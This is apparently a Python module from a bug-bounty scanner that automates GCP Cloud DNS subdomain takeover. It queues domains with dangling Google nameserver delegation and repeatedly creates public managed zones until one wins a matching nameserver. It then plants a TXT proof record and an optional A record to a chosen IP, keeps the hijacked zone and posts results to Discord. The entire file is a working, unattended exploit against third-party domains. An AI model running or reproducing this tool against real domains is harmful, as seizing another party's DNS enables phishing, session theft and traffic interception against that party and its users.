"""
app/takeover/ns_hunter/providers/gcp_dns_takeover.py

GCP Cloud DNS NS-lottery takeover — automated PoC for dangling GCP DNS delegation.

HOW IT WORKS
------------
GCP Cloud DNS assigns nameservers from a fixed pool (ns-cloud-{a,b,c,d}{1-4}.googledomains.com)
when a managed zone is created. If a domain's NS delegation points at GCP Cloud DNS
but the managed zone was deleted, an attacker can create a new zone and win the
correct NS assignment by lottery:

  1. Create up to NUM_ZONES managed zones simultaneously in the target GCP project.
     Each gets a random NS set from the googledomains.com pool.
  2. Check each zone's assigned NS for a match against the stale delegation NS.
  3. On match: add TXT PoC record (and optional A record if POC_IP configured).
     Keep the winning zone and delete all losers.
  4. On no match in the single pass: delete all zones, fire failure Discord
     notification, stop (no retry).

Zone naming — collision-safe
------------------------------
  Format: sto-{sanitized_domain}-{index}
  Example: api.example.com → sto-api-example-com-1 … sto-api-example-com-20

  Zone names in GCP Cloud DNS must be lowercase letters, digits, hyphens only.
  Max 63 chars. Two concurrent scans for different targets never collide because
  domain name is embedded in the zone name.

CONFIG (.env)
-------------
  GCP_PROJECT_ID               — required (reused from gcp_eip)
  GCP_SERVICE_ACCOUNT_JSON     — path to SA JSON file (or GCP_SERVICE_ACCOUNT_KEY)
  GCP_SERVICE_ACCOUNT_KEY      — SA JSON content directly
  GCP_DNS_TAKEOVER_ENABLED     = true
  GCP_DNS_NUM_ZONES            = 20
  POC_TXT                      = "Bugbounty - DNS takeover POC by Rizin"
  POC_TTL                      = 300
  POC_IP                       = ""   (optional — adds A record on success)

INTEGRATION
-----------
  GCPDNSTakeoverQueue.enqueue(subdomain, target_ns_set, program_name, platform)
  GCPDNSTakeoverQueue.start_worker()   # once at daemon startup

DB COLUMN REQUIRED
------------------
  subdomains.gcp_dns_attempted_at  TIMESTAMP  nullable

  Add to run_enum_migrations() in app/db/session.py:
    "ALTER TABLE subdomains ADD COLUMN IF NOT EXISTS gcp_dns_attempted_at TIMESTAMP",
    "CREATE INDEX IF NOT EXISTS ix_subdomains_gcp_dns_attempted_at ON subdomains (gcp_dns_attempted_at)",

GCP NAMESERVER PATTERNS
------------------------
  ns-cloud-a1.googledomains.com  → ns-cloud-a4.googledomains.com
  ns-cloud-b1.googledomains.com  → ns-cloud-b4.googledomains.com
  ns-cloud-c1.googledomains.com  → ns-cloud-c4.googledomains.com
  ns-cloud-d1.googledomains.com  → ns-cloud-d4.googledomains.com

PERMISSIONS NEEDED
------------------
  Service account needs:
    dns.managedZones.create
    dns.managedZones.delete
    dns.managedZones.get
    dns.resourceRecordSets.create
  Role: roles/dns.admin on the project
"""

from __future__ import annotations

import asyncio
import json
import re
from dataclasses import dataclass
from datetime import datetime
from typing import List, Optional, Set

from app.core.config import settings
from app.core.logging import logger
from app.db.session import get_session


# ---------------------------------------------------------------------------
# Config helpers
# ---------------------------------------------------------------------------

def _cfg(key: str, default):
    return getattr(settings, key, default)


def _gcp_dns_enabled() -> bool:
    return (
        bool(_cfg("GCP_DNS_TAKEOVER_ENABLED", True))
        and bool(_cfg("GCP_PROJECT_ID", None))
        and (bool(_cfg("GCP_SERVICE_ACCOUNT_JSON", None)) or bool(_cfg("GCP_SERVICE_ACCOUNT_KEY", None)))
    )


def _is_valid_ipv4(ip: str) -> bool:
    parts = ip.split(".")
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(p) <= 255 for p in parts)
    except ValueError:
        return False


def _zone_name(subdomain_name: str, index: int) -> str:
    """
    Build a collision-safe GCP Cloud DNS zone name for a subdomain + index.

    GCP zone names: lowercase letters, digits, hyphens only. Max 63 chars.
    Format: sto-{sanitized}-{index}

    Examples:
      api.example.com, 1  → sto-api-example-com-1
      sub.long.target.io, 20 → sto-sub-long-target-io-20
    """
    sanitized = subdomain_name.lower()
    sanitized = sanitized.replace(".", "-")
    sanitized = re.sub(r"[^a-z0-9\-]", "", sanitized)
    sanitized = re.sub(r"-{2,}", "-", sanitized)
    sanitized = sanitized.strip("-")

    suffix = f"-{index}"
    prefix = "sto-"
    max_body = 63 - len(prefix) - len(suffix)
    if len(sanitized) > max_body:
        sanitized = sanitized[:max_body].rstrip("-")

    return f"{prefix}{sanitized}{suffix}"


def _get_gcp_credentials():
    """Build GCP credentials from service account JSON path or key content."""
    from google.oauth2 import service_account

    sa_key = _cfg("GCP_SERVICE_ACCOUNT_KEY", None)
    sa_path = _cfg("GCP_SERVICE_ACCOUNT_JSON", None)

    scopes = ["https://www.googleapis.com/auth/cloud-platform"]

    if sa_key:
        info = json.loads(sa_key)
        return service_account.Credentials.from_service_account_info(info, scopes=scopes)
    elif sa_path:
        return service_account.Credentials.from_service_account_file(sa_path, scopes=scopes)
    else:
        raise RuntimeError("No GCP credentials configured (GCP_SERVICE_ACCOUNT_KEY or GCP_SERVICE_ACCOUNT_JSON)")


# ---------------------------------------------------------------------------
# Job dataclass
# ---------------------------------------------------------------------------

@dataclass
class _GCPDNSJob:
    subdomain_id:   int
    subdomain_name: str   # e.g. "api.example.com"
    target_ns_set:  List[str]  # stale NS set pointing at GCP (googledomains.com NS)
    program_name:   str
    platform:       str
    scope_id:       int


# ---------------------------------------------------------------------------
# Core lottery logic
# ---------------------------------------------------------------------------

async def _run_gcp_dns_lottery(job: _GCPDNSJob) -> tuple[bool, List[str]]:
    """
    Single-pass GCP Cloud DNS NS lottery.

    Returns (True, winning_ns_list) on success, (False, []) on failure.
    """
    try:
        from googleapiclient import discovery
        from googleapiclient.errors import HttpError
    except ImportError:
        logger.error(
            "gcp_dns_takeover: google-api-python-client not installed. "
            "pip install google-api-python-client google-auth"
        )
        return False, []

    num_zones = int(_cfg("GCP_DNS_NUM_ZONES", 20))
    poc_txt   = str(_cfg("POC_TXT", "Bugbounty - DNS takeover POC by Rizin"))
    poc_ttl   = int(_cfg("POC_TTL", 300))
    poc_ip    = str(_cfg("POC_IP", "") or "").strip()
    project   = str(_cfg("GCP_PROJECT_ID", ""))

    target_domain = job.subdomain_name
    # Normalize target NS to lowercase
    target_ns: Set[str] = {ns.lower().rstrip(".") for ns in job.target_ns_set}

    logger.info(
        "gcp_dns_takeover: starting single-pass lottery for %s "
        "(num_zones=%d, target_ns=%s)",
        target_domain, num_zones, sorted(target_ns),
    )

    loop = asyncio.get_running_loop()

    def _make_dns_client():
        creds = _get_gcp_credentials()
        return discovery.build("dns", "v1", credentials=creds, cache_discovery=False)

    active_zones: List[str] = []   # zone names we created
    winning_zone: Optional[str] = None
    winning_ns:   List[str] = []

    try:
        # ── PHASE 1: CREATE ZONES ─────────────────────────────────────────────
        for i in range(1, num_zones + 1):
            zone_name = _zone_name(target_domain, i)
            dns_name  = target_domain.rstrip(".") + "."

            try:
                def _create_zone(zn=zone_name, dn=dns_name):
                    client = _make_dns_client()
                    body = {
                        "name":        zn,
                        "dnsName":     dn,
                        "description": "STOscanner NS takeover PoC zone",
                        "visibility":  "public",
                    }
                    return client.managedZones().create(
                        project=project, body=body
                    ).execute(), client

                result, client_ref = await loop.run_in_executor(None, _create_zone)
                active_zones.append(zone_name)

                # GCP returns nameServers in the zone resource
                assigned_ns_raw = result.get("nameServers", [])
                assigned_ns = {ns.lower().rstrip(".") for ns in assigned_ns_raw}

                logger.debug(
                    "gcp_dns_takeover: [%d/%d] zone=%s assigned_ns=%s",
                    i, num_zones, zone_name, sorted(assigned_ns),
                )

                if assigned_ns & target_ns:
                    winning_match = sorted(assigned_ns & target_ns)
                    logger.info(
                        "gcp_dns_takeover: MATCH on zone=%s matched_ns=%s",
                        zone_name, winning_match,
                    )
                    winning_zone = zone_name
                    winning_ns   = list(assigned_ns_raw)
                    break

            except asyncio.CancelledError:
                raise
            except Exception as exc:
                exc_str = str(exc)
                if "alreadyExists" in exc_str or "409" in exc_str:
                    # Zone with this name already exists (orphan from crash)
                    # Still track it so we can delete it during cleanup
                    active_zones.append(zone_name)
                    logger.warning(
                        "gcp_dns_takeover: zone %s already exists (orphan) — tracking for cleanup",
                        zone_name,
                    )
                else:
                    logger.warning(
                        "gcp_dns_takeover: error creating zone %s: %s — skipping",
                        zone_name, exc,
                    )

        # ── PHASE 2: RESULT ───────────────────────────────────────────────────
        if winning_zone:
            await _add_poc_records_gcp(winning_zone, target_domain, poc_txt, poc_ttl, poc_ip, project)

            # Delete all loser zones
            loser_zones = [z for z in active_zones if z != winning_zone]
            logger.info("gcp_dns_takeover: cleaning up %d loser zone(s)", len(loser_zones))

            for zone in loser_zones:
                await _delete_zone_gcp(zone, project)

            return True, winning_ns

        else:
            logger.info(
                "gcp_dns_takeover: no NS match after %d zone(s) for %s — cleaning up",
                len(active_zones), target_domain,
            )
            for zone in active_zones:
                await _delete_zone_gcp(zone, project)
            return False, []

    except asyncio.CancelledError:
        logger.info(
            "gcp_dns_takeover: cancelled — cleaning up %d zone(s)", len(active_zones)
        )
        for zone in active_zones:
            await _delete_zone_gcp(zone, project)
        raise


async def _add_poc_records_gcp(
    zone_name:   str,
    domain:      str,
    poc_txt:     str,
    poc_ttl:     int,
    poc_ip:      str,
    project:     str,
) -> None:
    """Add TXT (always) and A (if POC_IP valid) PoC records to the winning zone."""
    from googleapiclient import discovery

    loop = asyncio.get_running_loop()
    dns_name = domain.rstrip(".") + "."

    additions = [
        {
            "name":    dns_name,
            "type":    "TXT",
            "ttl":     poc_ttl,
            "rrdatas": [f'"{poc_txt}"'],
        }
    ]

    if poc_ip and _is_valid_ipv4(poc_ip):
        additions.append({
            "name":    dns_name,
            "type":    "A",
            "ttl":     poc_ttl,
            "rrdatas": [poc_ip],
        })

    def _apply_change():
        from google.oauth2 import service_account
        sa_key  = _cfg("GCP_SERVICE_ACCOUNT_KEY", None)
        sa_path = _cfg("GCP_SERVICE_ACCOUNT_JSON", None)
        scopes  = ["https://www.googleapis.com/auth/cloud-platform"]
        if sa_key:
            creds = service_account.Credentials.from_service_account_info(
                json.loads(sa_key), scopes=scopes
            )
        else:
            creds = service_account.Credentials.from_service_account_file(
                sa_path, scopes=scopes
            )
        client = discovery.build("dns", "v1", credentials=creds, cache_discovery=False)
        change = {"additions": additions}
        client.changes().create(
            project=project, managedZone=zone_name, body=change
        ).execute()

    try:
        await loop.run_in_executor(None, _apply_change)
        record_types = " + ".join(a["type"] for a in additions)
        logger.info(
            "gcp_dns_takeover: PoC records added (%s) to zone %s", record_types, zone_name
        )
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error(
            "gcp_dns_takeover: failed to add PoC records to %s: %s — "
            "zone still kept, add records manually",
            zone_name, exc,
        )


async def _delete_zone_gcp(zone_name: str, project: str) -> None:
    """Delete a GCP Cloud DNS managed zone. Best-effort, non-fatal."""
    from googleapiclient import discovery

    loop = asyncio.get_running_loop()

    def _do_delete():
        creds = _get_gcp_credentials()
        client = discovery.build("dns", "v1", credentials=creds, cache_discovery=False)
        # Must first delete all non-NS/SOA records before deleting the zone
        try:
            rrsets = client.resourceRecordSets().list(
                project=project, managedZone=zone_name
            ).execute()
            deletions = [
                r for r in rrsets.get("rrsets", [])
                if r["type"] not in ("NS", "SOA")
            ]
            if deletions:
                change = {"deletions": deletions}
                client.changes().create(
                    project=project, managedZone=zone_name, body=change
                ).execute()
        except Exception:
            pass
        client.managedZones().delete(project=project, managedZone=zone_name).execute()

    try:
        await loop.run_in_executor(None, _do_delete)
        logger.debug("gcp_dns_takeover: deleted zone %s", zone_name)
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.warning("gcp_dns_takeover: failed to delete zone %s: %s", zone_name, exc)


# ---------------------------------------------------------------------------
# DB helpers
# ---------------------------------------------------------------------------

async def _stamp_attempted_gcp(subdomain_id: int) -> None:
    from app.db.db_models import Subdomain as _Sub
    from sqlalchemy import select
    try:
        async with get_session() as session:
            sub = (await session.execute(
                select(_Sub).where(_Sub.id == subdomain_id)
            )).scalar_one_or_none()
            if sub:
                sub.gcp_dns_attempted_at = datetime.utcnow()
                await session.commit()
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error("gcp_dns_takeover: stamp attempted failed id=%d: %s", subdomain_id, exc)


async def _stamp_success_gcp(subdomain_id: int, winning_ns: List[str]) -> None:
    from app.db.db_models import Subdomain as _Sub, SubdomainState
    from sqlalchemy import select
    poc_ip = str(_cfg("POC_IP", "") or "").strip()
    try:
        async with get_session() as session:
            sub = (await session.execute(
                select(_Sub).where(_Sub.id == subdomain_id)
            )).scalar_one_or_none()
            if sub:
                a_note = f" A record → {poc_ip}." if poc_ip and _is_valid_ipv4(poc_ip) else ""
                sub.gcp_dns_attempted_at = datetime.utcnow()
                sub.takeover_provider    = "GCP Cloud DNS (NS lottery)"
                sub.takeover_evidence    = (
                    f"NS lottery matched. Winning NS: {winning_ns}. "
                    f"TXT PoC added.{a_note} Zone kept — screenshot and report."
                )
                sub.confidence           = 95
                sub.state                = SubdomainState.DANGLING
                sub.last_state_change_at = datetime.utcnow()
                await session.commit()
                logger.info("gcp_dns_takeover: %s → DANGLING confidence=95", sub.name)
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error("gcp_dns_takeover: stamp success failed id=%d: %s", subdomain_id, exc)


# ---------------------------------------------------------------------------
# Discord notifications
# ---------------------------------------------------------------------------

async def _notify_result_gcp(job: _GCPDNSJob, success: bool, winning_ns: List[str]) -> None:
    """Send Discord notification for GCP DNS takeover result (success or failure)."""
    from app.notify.discord import DiscordNotifier

    if not getattr(settings, "DISCORD_WEBHOOK_URL", None):
        return

    poc_ip  = str(_cfg("POC_IP", "") or "").strip()
    poc_txt = str(_cfg("POC_TXT", "Bugbounty PoC"))

    if success:
        a_note = (
            f" A record `{job.subdomain_name} → {poc_ip}` also added."
            if poc_ip and _is_valid_ipv4(poc_ip) else ""
        )
        title       = f"✅ GCP DNS Takeover Success — {job.subdomain_name}"
        description = (
            f"**Program**: {job.program_name}\n"
            f"**Platform**: {job.platform}\n"
            f"**Domain**: `{job.subdomain_name}`\n"
            f"**Matched NS**: `{', '.join(winning_ns)}`\n"
            f"**TXT PoC**: `{poc_txt}`{a_note}\n\n"
            f"Zone is LIVE. Screenshot, submit report, then delete the "
            f"winning Cloud DNS zone via GCP Console."
        )
        color = 0x00C853
    else:
        num_zones = int(_cfg("GCP_DNS_NUM_ZONES", 20))
        title       = f"⚠️ GCP DNS Takeover Failed — {job.subdomain_name}"
        description = (
            f"**Program**: {job.program_name}\n"
            f"**Platform**: {job.platform}\n"
            f"**Domain**: `{job.subdomain_name}`\n"
            f"**Target NS**: `{', '.join(sorted(job.target_ns_set))}`\n\n"
            f"Single-pass lottery ({num_zones} zones) found no NS match. "
            f"All zones cleaned up.\n\n"
            f"**Manual option**: Create a Cloud DNS managed zone for "
            f"`{job.subdomain_name}` in GCP Console and check the assigned NS."
        )
        color = 0xFF6D00

    try:
        notifier = DiscordNotifier()
        await notifier.send_raw(title=title, description=description, color=color)
    except Exception as exc:
        logger.error("gcp_dns_takeover: Discord result notify failed: %s", exc)


# ---------------------------------------------------------------------------
# Queue + background worker
# ---------------------------------------------------------------------------

class GCPDNSTakeoverQueue:
    """
    Singleton async queue for GCP Cloud DNS lottery jobs.

    Usage
    -----
      GCPDNSTakeoverQueue.enqueue(subdomain, target_ns_set, program_name, platform)
      GCPDNSTakeoverQueue.start_worker()   # once at daemon startup
    """

    _queue:     asyncio.Queue          = asyncio.Queue()
    _worker:    Optional[asyncio.Task] = None
    _in_flight: Set[int]               = set()

    @classmethod
    def enqueue(
        cls,
        subdomain,
        target_ns_set: List[str],
        program_name:  str,
        platform:      str,
    ) -> bool:
        if not _gcp_dns_enabled():
            logger.debug(
                "gcp_dns_takeover: disabled or creds not set — skipping %s",
                subdomain.name,
            )
            return False

        if getattr(subdomain, "gcp_dns_attempted_at", None) is not None:
            logger.debug(
                "gcp_dns_takeover: %s already attempted — skipping", subdomain.name
            )
            return False

        if subdomain.id in cls._in_flight:
            logger.debug(
                "gcp_dns_takeover: %s already in-flight — skipping", subdomain.name
            )
            return False

        # Filter to only GCP NS servers in the delegation set
        gcp_ns = [ns for ns in target_ns_set if "googledomains.com" in ns.lower()]
        if not gcp_ns:
            logger.debug(
                "gcp_dns_takeover: no googledomains.com NS in delegation for %s — skipping",
                subdomain.name,
            )
            return False

        job = _GCPDNSJob(
            subdomain_id   = subdomain.id,
            subdomain_name = subdomain.name,
            target_ns_set  = gcp_ns,
            program_name   = program_name,
            platform       = platform,
            scope_id       = getattr(subdomain, "scope_id", 0),
        )
        cls._in_flight.add(subdomain.id)
        cls._queue.put_nowait(job)
        logger.info(
            "gcp_dns_takeover: enqueued %s (queue depth=%d)",
            subdomain.name, cls._queue.qsize(),
        )
        return True

    @classmethod
    def start_worker(cls) -> None:
        if cls._worker is None or cls._worker.done():
            cls._worker = asyncio.create_task(cls._worker_loop())
            logger.info("gcp_dns_takeover: background worker started")

    @classmethod
    async def _worker_loop(cls) -> None:
        job = None
        while True:
            try:
                job = await cls._queue.get()
                logger.info(
                    "gcp_dns_takeover: processing %s", job.subdomain_name
                )

                await _stamp_attempted_gcp(job.subdomain_id)

                try:
                    success, winning_ns = await _run_gcp_dns_lottery(job)
                except asyncio.CancelledError:
                    cls._queue.task_done()
                    raise
                except Exception as exc:
                    logger.error(
                        "gcp_dns_takeover: unhandled error for %s: %s",
                        job.subdomain_name, exc,
                    )
                    success, winning_ns = False, []

                if success:
                    await _stamp_success_gcp(job.subdomain_id, winning_ns)

                # Always send result notification (success or failure)
                await _notify_result_gcp(job, success, winning_ns)

            except asyncio.CancelledError:
                logger.info("gcp_dns_takeover: worker shutting down")
                return
            except Exception as exc:
                logger.error("gcp_dns_takeover: worker loop error: %s", exc)
            finally:
                if job is not None:
                    cls._in_flight.discard(job.subdomain_id)
                    job = None
                try:
                    cls._queue.task_done()
                except Exception:
                    pass